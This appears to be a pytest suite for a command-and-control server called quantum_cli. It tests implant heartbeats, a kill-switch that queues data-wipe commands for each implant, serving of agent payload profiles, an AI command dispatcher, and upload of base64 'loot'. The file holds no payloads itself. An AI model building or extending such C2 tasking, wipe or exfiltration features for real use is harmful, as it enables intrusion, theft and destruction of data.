"""test_c2 — flask test-client against the C2 (/r heartbeat + /kill arm/disarm)."""
import quantum_cli as q


def _client():
    q.TASKQ.clear()
    q.KILLSWITCH["on"] = False
    app = q.make_c2({"default": "# test agent", "linux": "# test posix"})
    return app.test_client()


def test_r_heartbeat_200_json():
    c = _client()
    resp = c.post("/r", json={"host": "t1", "act": "hb"})
    assert resp.status_code == 200
    data = resp.get_json()
    assert isinstance(data, dict)
    assert data.get("act") == "none"
    assert "t1" in q.TASKQ


def test_kill_arms_killswitch_and_populates_wipe_tasks():
    c = _client()
    assert c.post("/r", json={"host": "t1", "act": "hb"}).status_code == 200
    resp = c.post("/kill", json={"arm": True})
    assert resp.status_code == 200
    assert q.KILLSWITCH["on"] is True
    assert "t1" in q.TASKQ, "arming must populate the implant's TASKQ wipe task"
    task = q.TASKQ["t1"]
    assert task.get("act") == "run"
    assert "cmd" in task


def test_kill_disarm():
    c = _client()
    c.post("/r", json={"host": "t1", "act": "hb"})
    c.post("/kill", json={"arm": True})
    resp = c.post("/kill", json={"arm": False})
    assert resp.status_code == 200
    assert q.KILLSWITCH["on"] is False
    assert resp.get_json().get("note") == "kill-switch disarmed"


def test_s_profile_served():
    c = _client()
    # canonical /s serves the default profile directly
    assert c.get("/s").status_code == 200
    assert b"test agent" in c.get("/s").data
    # explicit non-default profile matches /s/<profile> without redirect
    resp = c.get("/s/linux")
    assert resp.status_code == 200
    assert b"test posix" in resp.data
    # /s/default redirects to the canonical /s (defaults rule) — spec behavior
    resp = c.get("/s/default", follow_redirects=True)
    assert resp.status_code == 200
    assert b"test agent" in resp.data
    assert c.get("/s/nope").status_code == 404


def test_dash_200_html():
    c = _client()
    resp = c.get("/dash")
    assert resp.status_code == 200
    assert b"QUANTUMDASH" in resp.data


def test_dash_state_json():
    c = _client()
    resp = c.get("/dash/api/state")
    assert resp.status_code == 200
    data = resp.get_json()
    assert "killswitch" in data
    assert "decisions" in data and "audit" in data and "mitre" in data


def test_ai_dispatcher_status():
    c = _client()
    resp = c.post("/ai", json={"cmd": "status", "params": {}})
    assert resp.status_code == 200
    assert resp.get_json().get("ok") is True


def test_posix_drop_sealed():
    import base64
    c = _client()
    resp = c.post("/r", json={"host": "t1", "act": "drop",
                              "data": base64.b64encode(b"loot").decode()})
    assert resp.status_code == 200
